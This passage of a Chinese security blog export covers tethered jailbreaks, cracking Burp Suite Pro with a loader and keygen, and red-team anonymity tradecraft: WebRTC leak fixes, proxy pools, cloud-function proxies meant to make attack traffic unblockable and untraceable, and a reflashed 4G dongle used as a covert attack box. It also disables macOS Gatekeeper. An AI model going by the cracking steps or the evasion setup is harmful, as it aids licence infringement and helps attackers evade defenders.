<p>Tethered jailbreaks are not meant to be used by the general public. These exploits modify the device in a way that it requires a PC to even boot at all, even without a jailbreak.</p>
<p>Because of this, these tend to only be used by jailbreak developers getting ready for a newer version of iOS.</p>
<p>越狱工具-》适用于不同版本手机和ios版本</p>
]]></content>
  </entry>
  <entry>
    <title>破解，再给新下载的burp加个快捷方式</title>
    <url>/2023/04/23/%E7%A0%B4%E8%A7%A3%EF%BC%8C%E5%86%8D%E7%BB%99%E6%96%B0%E4%B8%8B%E8%BD%BD%E7%9A%84burp%E5%8A%A0%E4%B8%AA%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<blockquote>
<p>拜托，有个双击就可以打开的burp真的很酷好吗？</p>
</blockquote>
<p>咱就是说，在kali和mac上使用burp有那么些不自然</p>
<h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>通常呢，咱们都是在52破解下载最新版的burpsuite<br><a class="link"   href="https://down.52pojie.cn/Tools/Network_Analyzer/Burp_Suite_Pro_v2022.2.2_Loader_Keygen.zip" >https://down.52pojie.cn/Tools/Network_Analyzer&#x2F;Burp_Suite_Pro_v2022.2.2_Loader_Keygen.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>但52破解的破解器总是用的1.7版本，有些功能真的跟不上</p>
<p>所以，咱们直接从官方下载正式版的pro<br>然后去全球最大的同性交友网站找到最新的keygen<br>之后怎么做不用我介绍了吧<br>之后的破解流程就没啥好说的了，破解器作者已经表述得很详尽了</p>
<p>下载链接留这里<br>burpsuite pro：<a class="link"   href="https://portswigger.net/burp/pro" >https://portswigger.net/burp/pro <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>Keygen：<a class="link"   href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases" >https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="制作快捷方式"><a href="#制作快捷方式" class="headerlink" title="制作快捷方式"></a>制作快捷方式</h2><p>把文件移动到&#x2F;usr&#x2F;bin目录中</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> BurpLoaderKeygen.jar burpsuite_pro_v2022.2.2.jar /usr/bin</span><br></pre></td></tr></table></figure></div>

<p>先删掉免费的社区版本</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">apt remove burpsuite</span><br></pre></td></tr></table></figure></div>

<p>配置快捷方式:<br>在&#x2F;usr&#x2F;bin下创建burpsuite</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim burpsuite</span><br></pre></td></tr></table></figure></div>

<p>将keygen上的loader commond复制粘贴</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">/usr/lib/jvm/java-17-openjdk-amd64/bin/java --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED -javaagent:/usr/bin/BurpLoaderKeygen.jar -noverify -jar /usr/bin/burpsuite_pro_v2022.2.2.jar</span><br></pre></td></tr></table></figure></div>

<p>增加执行权限,进入&#x2F;usr&#x2F;share&#x2F;applications，创建并编辑burpsuite的快捷方式</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x burpsuite</span><br><span class="line"><span class="built_in">cd</span> /usr/share/applications/</span><br><span class="line">vim burpsuite.desktop</span><br></pre></td></tr></table></figure></div>

<p>填入代码</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Name=burpsuite</span><br><span class="line">Encoding=UTF-8</span><br><span class="line">Exec=sh -c <span class="string">&quot;/usr/bin/burpsuite&quot;</span></span><br><span class="line">Icon=kali-burpsuite</span><br><span class="line">StartupNotify=<span class="literal">false</span></span><br><span class="line">Terminal=<span class="literal">false</span></span><br><span class="line">Type=Application</span><br><span class="line">Categories=03-webapp-analysisc;03-06-web-application-proxies;</span><br><span class="line">X-Kali-Package=burpsuite</span><br></pre></td></tr></table></figure></div>

<p>ok</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>2022.9版本的破解有些改变，根据沈沉舟大佬的描述：</p>
<blockquote>
<p>“2022.9版注册机制并未发生变化，仅仅是相关代码具体实现做了微调，导致class的字节码发生变化，而旧版loader模式匹配时约束条件太强，兼容性不足。”</p>
</blockquote>
<p>故新版本的破解流程稍有更改</p>
<p>首先把需要的部分下载一下，我用的是mac，理论上比linux和win那边麻烦点（实际操作的时候也是很麻烦）  </p>
<p>安装好app后，右键查看包内容，把loader和keygen移动到app路径下，主要是放在burpsuite旁边  </p>
<p>由于这个loader名字太难打，咱直接改名burploader<br>右键打开terminal，命令启动burpsuite和keygen</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar BurpLoaderKeygen.jar</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">java -javaagent:burploader.jar -noverify -jar burpsuite_pro.jar</span><br></pre></td></tr></table></figure></div>

<p>后面注册的过程都是一样的，咱直接跳到关键过程<br>注册成功后从启动台打开还是app还是没注册的样子  </p>
<p>咱还是进入包内容，添加点内容</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">-javaagent:burploader.jar</span><br><span class="line">-noverify</span><br></pre></td></tr></table></figure></div>

<p>之后就可以正常打开了</p>
<p>P.S.<br>关于mac更新时遇到的那些操作<br>安装新版本前务必删除全部相关文件  </p>
<p>苹果的安全机制，修改包内容后会遇到文件损坏的报错<br>这个时候直接</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo spctl --master-disable</span><br></pre></td></tr></table></figure></div>


<p>就完事了  </p>
]]></content>
  </entry>
  <entry>
    <title>红队的夜行衣——反反制的那些事</title>
    <url>/2023/06/12/%E7%BA%A2%E9%98%9F%E7%9A%84%E5%A4%9C%E8%A1%8C%E8%A1%A3%E2%80%94%E2%80%94%E5%8F%8D%E5%8F%8D%E5%88%B6%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
    <content><![CDATA[<blockquote>
<p>有同志问了，那我就献丑了。</p>
</blockquote>
<h2 id="蓝队在防什么"><a href="#蓝队在防什么" class="headerlink" title="蓝队在防什么"></a>蓝队在防什么</h2><p>作为多年参与蓝队的点鼠标猴子，我简单讲讲猴子平常干点啥。<br>先不涉及蓝队的前期布防，直接讲攻防进行时。</p>
<ul>
<li>监控：通过安全设备，发现异常流量，定位发起者ip和url，将相关流量情况上报给研判。<br></li>
<li>研判：在第一天的时候也会做点监控的活，将发现的异常流量进行分析，确认流量中的行为是否是红方攻击流量，需要与甲方的技术人员进行沟通确认。如果发现流量中存在红方身份特征，同时会要求溯源人员进行及时响应。<br></li>
<li>指挥：背锅的<br>
通常甲方不会外聘“指挥”，当然，如果指挥也是甲方外聘的，那么乙方能放进甲方的岗位通常就这三种，至于溯源嘛，那是乙方原厂自己的人，想参与溯源的临时参与者就别想了。<br>
综上，蓝队会从安全设备中发现并提取带有 *攻击特征* 的流量信息，同时会从蜜罐中寻找同样特征的信息，并确认红方身份，进行溯源，同时IP封禁。</li>
</ul>
<h2 id="打铁还需自身硬"><a href="#打铁还需自身硬" class="headerlink" title="打铁还需自身硬"></a>打铁还需自身硬</h2><p>作为红队，除了需要有足够强悍的<em>外网打点</em>、<em>漏洞挖掘</em> 、<em>内网渗透</em>这些实力外，还需要在反溯源、反定位、反暴露、流量特征隐藏等手段中磨练，以下是笔者意识到的部分问题。</p>
<h3 id="WebRTC——真实IP暴露的罪魁祸首"><a href="#WebRTC——真实IP暴露的罪魁祸首" class="headerlink" title="WebRTC——真实IP暴露的罪魁祸首"></a>WebRTC——真实IP暴露的罪魁祸首</h3><p>说起这件事，还要从今年微博博主：安全北北的一篇微博说起<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230608145739.1fjkjpneb77k.png"
                      alt="Pasted-image-20230608145739" 
                ><figcaption>Pasted-image-20230608145739</figcaption></figure><br>获取ip的网站：<br><a class="link"   href="https://www.hackjie.com/tracking" >https://www.hackjie.com/tracking <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://ip8.com/webrtc-test" >https://ip8.com/webrtc-test <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>打开网站后我们发现自己的ip直接就在网站上显示出来了，这事谁看谁崩溃 ，于是就有了这样一个疑问：为什么即使平常有挂代理的习惯，还是会暴露外网ip呢？</p>
<blockquote>
<ul>
<li><strong>什么是WebRTC？</strong><br> 网络实时通信（WebRTC）是一项先进的开源技术，允许台式机和移动浏览器通过使用简单的API实时交换数据。<br> WebRTC有大量的用途，包括通过移动或基于网络的应用实现音频、视频和网络功能。WebRTC的功能类似于媒体捕获和流媒体API。所有这三种功能可以结合起来，实现网络上前所未有的惊人的多媒体功能。<br> WebRTC的关键优势在于它能实现实时的点对点多媒体通信，这在当今的数字媒体时代是不可缺少的。</li>
<li><strong>关键组成部分</strong><br>  WebRTC包括3个主要的API：<br>  - 同行连接：这允许你发送和接收多媒体文件<br>  - GetUserMedia：顾名思义，它可以访问用户的媒体（如摄像头和麦克风）。<br>  - 数据通道：允许在浏览器之间直接传输非媒体。</li>
</ul>
</blockquote>
<pre><code>    WebRTC目前在以下浏览器上得到支持：Mozilla Firefox, Opera, Chrome和Google Chrome。
</code></pre>
<blockquote>
<ul>
<li><strong>反面</strong><br>  WebTRC的一个主要缺点是，由于用户使用的VPN泄露了他们的IP地址，用户的隐私可能会受到影响。<br>  由Paolo Stagno在2015年发现并标记为 “WebTRC泄漏”，当一些知名的VPN供应商开始在未经用户同意的情况下将用户的IP地址泄露给网站时，一些用户的隐私被泄露了。<br>  更糟糕的是，最近的一项调查指出，有23%的VPN供应商正在泄露用户的IP地址，并保留了设备类型、个人信息、访问过的网站，甚至是支付信息等个人信息。</li>
</ul>
</blockquote>
<p>简单来说就是，WebRTC这个技术，直接将你的浏览器和服务端建立联系，绕过了中间所有的代理。</p>
<p>我们打开B站搜索WebRTC，会看到，这个技术经常应用于视频通话、点对点通信等等。<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230608151944.4au5uej22hk0.png"
                      alt="Pasted-image-20230608151944" 
                ><figcaption>Pasted-image-20230608151944</figcaption></figure></p>
<blockquote>
<ul>
<li><strong>防范策略</strong></li>
</ul>
</blockquote>
<ol>
<li>直接从浏览器扩展入手：<br> 下载并安装Chrome&#x2F;Edge&#x2F;Firefox浏览器扩展：WebRTC Leak Shield<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">https://chrome.google.com/webstore/detail/webrtc-leak-shield/bppamachkoflopbagkdoflbgfjflfnfl  </span><br><span class="line"></span><br><span class="line">https://microsoftedge.microsoft.com/addons/detail/pblfgfehcokbglafpcldgjpmknildihk  </span><br><span class="line"></span><br><span class="line">https://addons.mozilla.org/en-US/firefox/addon/webrtc-leak-shield/</span><br></pre></td></tr></table></figure></div></li>
<li>从浏览器本身配置入手：<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">chrome://flags/#enable-webrtc-hide-local-ips-with-mdns  </span><br><span class="line">opera://flags/#enable-webrtc-hide-local-ips-with-mdns  </span><br><span class="line">edge://flags/#enable-webrtc-hide-local-ips-with-mdns</span><br></pre></td></tr></table></figure></div>
但经过测试，还是扩展好用<br> Firefox配置项：<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">about:config  </span><br><span class="line">media.peerconnection.enabled</span><br></pre></td></tr></table></figure></div>
FireFox不需要扩展，直接配置就比上面那些搞扩展的好使。</li>
</ol>
<blockquote>
<ul>
<li><strong>再测试</strong>：</li>
</ul>
</blockquote>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230608153324.75gq8evsrd80.png"
                      alt="Pasted-image-20230608153324" 
                ><figcaption>Pasted-image-20230608153324</figcaption></figure>

<h2 id="代理池"><a href="#代理池" class="headerlink" title="代理池"></a>代理池</h2><p>作为一个红队成员，在打点过程中，最讨厌的就是信息还在收集，扫描器还在运行时，突然就拿不到数据了，不用问，被封ip了。<br>但信息收集和找口子阶段少不了大批量的扫描流量的发送了，这就需要红队自身要有足够多的ip喂给蓝队去封禁。<br>介绍几个代理池项目：<br><a class="link"   href="https://github.com/jhao104/proxy_pool" >https://github.com/jhao104/proxy_pool <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://github.com/Anyyy111/ProxyPoolxSocks" >https://github.com/Anyyy111/ProxyPoolxSocks <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>代理池的原理和代理服务器一样，没啥好讲的，只不过用于爬虫的代理服务器会快速更换代理ip，直到ip池中的ip都被封禁。<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230608161458.46xcx17x4o80.png"
                      alt="Pasted-image-20230608161458" 
                ><figcaption>Pasted-image-20230608161458</figcaption></figure><br>啥？你问我ip从哪来？买的，找ip提供商买的，和你科学上网买梯子是一回事。</p>
<hr>
<p>以上都是简单可操作的部分，接下来就要上强度了</p>
<hr>
<h2 id="云函数"><a href="#云函数" class="headerlink" title="云函数"></a>云函数</h2><blockquote>
<p>总结这一块知识的时候，感觉这一块内容太丰富，甚至应该单独开一篇来写</p>
</blockquote>
<h4 id="什么是云函数"><a href="#什么是云函数" class="headerlink" title="什么是云函数"></a>什么是云函数</h4><pre><code>云函数提供了一种直接在云上运行，无状态的、短暂的、由事件触发的代码的能力。
对比：
随着云服务的发展，计算资源高度抽象化，腾讯云提供了从物理服务器到云函数和横跨各种抽象程度的计算资源供用户选择。
黑石物理服务器：以物理机为扩展单位。用户完全拥有整台实体计算资源，安全性最好。
云服务器：以云服务器为扩展单位，虚拟化硬件设备。用户和其他租户共享物理机资源，仍可自行配置 CVM 的各项指标，相对部署和迭代更加简单。
容器服务：以服务为扩展单位，虚拟化操作系统。测试和生产环境完全一致，测试和部署非常轻松。
云函数：以函数为扩展单位，虚拟化运行时环境（Runtime）。是现有计算资源的最小单位，具有完全自动、一键部署、高度可扩展等特点，是轻量级服务部署非常好的选择。
【引自腾讯云文档】
</code></pre>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230612180542.1860haoz2q1s.png"
                      alt="Pasted-image-20230612180542" 
                ><figcaption>Pasted-image-20230612180542</figcaption></figure>

<p><strong>特性：</strong></p>
<ol>
<li>云函数不需要服务器，也就是说你不需要去买 VPS。 <br></li>
<li>云函数只是云厂商用自己的服务器帮你运行你上传的代码片段， 执行某个单一的逻辑，可以简单理解为只帮你执行一个函数。 <br></li>
<li>云函数无法长驻，调用的时候创建，执行完之后立即就销毁，所以无法直接保存状态。也正是这一点，让我们无法代理像 SSH 这种需要长连接的服务，只能代理 HTTP(s) 这种无状态的协议。 <br></li>
</ol>
<p>利用云厂商提供的云函数（函数计算）功能，将客户端的HTTP请求进行转发，由于云函数多出口的特性，让我们也变相拥有了代理池。</p>
<p>当前国内已知云平台，阿里云和腾讯云都可以使用云函数。</p>
<h4 id="怎么使用云函数"><a href="#怎么使用云函数" class="headerlink" title="怎么使用云函数"></a>怎么使用云函数</h4><p>目标：将burp、CS、webshell等攻击流量全部通过云函数代理，以达到不可封禁和不可溯源的效果。</p>
<p>设计：<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230612191411.4pyo23tedpc0.png"
                      alt="Pasted-image-20230612191411" 
                ><figcaption>Pasted-image-20230612191411</figcaption></figure><br>如图，浏览器访问流量经过本地代理程序，转发到云服务端，经由写好的云函数将我们发出的流量进行重新打包，并由云服务的DNS再次发送至目标站点。<br>从目标站点来看，我们发送的流量，都是由云服务商提供的ip进行的访问。<br>更有趣的是，无论是微步qax的威胁情报平台都会记录来自云服务商的干净ip。</p>
<p>于是我们根据场景，可以制作【基于云函数的socks代理】和【基于云函数的http代理】</p>
<p>以腾讯云为例<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230612192152.3kucz59u5iw0.png"
                      alt="Pasted-image-20230612192152" 
                ><figcaption>Pasted-image-20230612192152</figcaption></figure><br>在腾讯云控制台，找到函数服务，新建云函数<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230612192951.5h98nsy4xks0.png"
                      alt="Pasted-image-20230612192951" 
                ><figcaption>Pasted-image-20230612192951</figcaption></figure><br>云函数可以使用多种语言编写，当前已知的项目都是python写的<br>建议牛逼的大佬都用go来写<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230612193221.3wf994r3qvy0.png"
                      alt="Pasted-image-20230612193221" 
                ><figcaption>Pasted-image-20230612193221</figcaption></figure><br>之后配置timeout的时间，900秒，足够大佬在被封前拿到想要的数据了。<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230612193411.10pazdrlztxs.png"
                      alt="Pasted-image-20230612193411" 
                ><figcaption>Pasted-image-20230612193411</figcaption></figure><br>设置API触发<br>以上就是腾讯云的云函数实现socks代理的办法</p>
<p>http这一块相比，就是多了个鉴权，去B站还能找到添加了ssl证书的https版本。</p>
<p>可以看一下渣渣老师在2021年发布的腾讯云云函数代理办法:</p>
<p><a class="link"   href="https://www.bilibili.com/video/BV1x64y1873g/?share_source=copy_web&vd_source=c5b1bc1a031a95bca5007f137fe846b8" >https://www.bilibili.com/video/BV1x64y1873g/?share_source=copy_web&amp;vd_source=c5b1bc1a031a95bca5007f137fe846b8 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>也可也看看大C老师做的基于阿里云云函数代理办法，这个是用go写的:</p>
<p><a class="link"   href="https://www.bilibili.com/video/BV1ML4y1M7Cu/?share_source=copy_web&vd_source=c5b1bc1a031a95bca5007f137fe846b8" >https://www.bilibili.com/video/BV1ML4y1M7Cu/?share_source=copy_web&amp;vd_source=c5b1bc1a031a95bca5007f137fe846b8 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>啥？不会写？行吧，有位大佬在Github上发布了一键部署项目:<br> <a class="link"   href="https://github.com/shimmeris/SCFProxy/blob/main/README_zh.md" >https://github.com/shimmeris/SCFProxy/blob/main/README_zh.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>还看不懂就真的帮不了你了。</p>
<h2 id="利用硬件隐身"><a href="#利用硬件隐身" class="headerlink" title="利用硬件隐身"></a>利用硬件隐身</h2><p>这一块就没什么难的，我一句话概括：<strong>用手机开热点</strong></p>
<p>我就知道你会骂我</p>
<ul>
<li><p>手机开热点为什么好使吗？</p>
<p>  前面WebRTC中讲到，如果你使用宽带上网，服务器会获取你的公网ip，而公网ip都是由运营商提供的，除非你很有钱，买了一个独享的ip专线，否则，你就是和整个小区，甚至整个街区共用同一个ip。因此，ip定位不会太详细。</p>
</li>
</ul>
<p>比如，笔者所在的这个小县城共用一个ip。。。（手动狗头）</p>
<ul>
<li><p>问题又来了，手机开热点，也是运营商提供的上网服务啊，怎么就找不到呢？</p>
<p>  已知手机上网的办法并不是宽带的那一套，而是WCDMA的那一套东西，使用的ip是由基站分配的，也不会太详细。</p>
</li>
</ul>
<p>但即使不详细，这个定位依然很好使啊，至少它定位到了搞事情所在的城市甚至小区啊。<br><br><br>这里就用到了一个不起眼的小玩具：<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230612201324.5gs0c61u0280.webp"
                      alt="Pasted-image-20230612201324" 
                ><figcaption>Pasted-image-20230612201324</figcaption></figure></p>
<p>没错就是 <strong>随身WIFI</strong></p>
<p>还是手机开热点的那一套</p>
<p>但可以实现匿名的点在 <strong>流量卡</strong> 上，笔者曾经记录使用流量卡上网时的ip<br>每次ip定位都在不同的城市，从来就没有过ip定位在所在地附近的情况。<br>于是，渗透机流量经过随身WIFI转发，再经由14层协议到达目标，目标机上记录的ip就是和你丝毫没关系的运营商基站ip。</p>
<p>但这就完事了吗？这也太没劲了</p>
<p>如图，笔者把随身WIFI拆了，并深入进去逆了一下。</p>
<p>硬件：CPU4核｜ROM512MB｜RAM4GB</p>
<p>架构：ARM v7 Processor rev0（v7l）</p>
<p>自带系统：Android4.4</p>
<p>熟不熟悉？就是手机！</p>
<p>红米2的配置！</p>
<p>虽然性能不大，但是刷进去一个arm的linux系统不是刚刚好嘛？<br>于是我刷了个OpenWrt</p>
<p>然后连进去看看<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230612205751.30odvevfqvi0.webp"
                      alt="Pasted-image-20230612205751" 
                ><figcaption>Pasted-image-20230612205751</figcaption></figure><br>ok这就是个linux机子！</p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230612215035.6r5d92tsx640.webp"
                      alt="Pasted-image-20230612215035" 
                ><figcaption>Pasted-image-20230612215035</figcaption></figure>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230612215209.nkhbabb287k.webp"
                      alt="Pasted-image-20230612215209" 
                ><figcaption>Pasted-image-20230612215209</figcaption></figure>

<p>同时还可以安装Debian，Debian这一块我还没试<br>但是我们大胆推测<br>linux都有了，ssh上去，一顿nmap &amp;&amp; subfinder | httpx | nuclei<br>那可太爽了<br>甚至，写进去自动化渗透脚本，再把棒子找个信号好、有电源的地方一放<br>近源渗透的事也解决了有没有？</p>
<p>说回主题，既然这个随身WIFI棒子就是一个linux机子，那么我们把代理池云函数等同时集成到棒子上，我们就直接实现了随身软路由。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本篇文章我们从多种角度实现了红队的自我隐匿，而且付出代价不多。还方便逃跑。</p>
<hr>
<blockquote>
<p>参考：<br><a class="link"   href="https://mp.weixin.qq.com/s/A5dd7WXojGBzsz52_iLtJQ" >https://mp.weixin.qq.com/s/A5dd7WXojGBzsz52_iLtJQ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://cloud.tencent.com/developer/article/1857034" >https://cloud.tencent.com/developer/article/1857034 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://cloud.tencent.com/document/product/583/9694" >https://cloud.tencent.com/document/product/583/9694 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.cnblogs.com/supdon/p/15099742.html" >https://www.cnblogs.com/supdon/p/15099742.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://github.com/shimmeris/SCFProxy/blob/main/README_zh.md" >https://github.com/shimmeris/SCFProxy/blob/main/README_zh.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://qust.me/post/m[sm8916](https://acg.tv/sm8916)/" >https://qust.me/post/m[sm8916](https://acg.tv/sm8916)/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
]]></content>
  </entry>
</search>
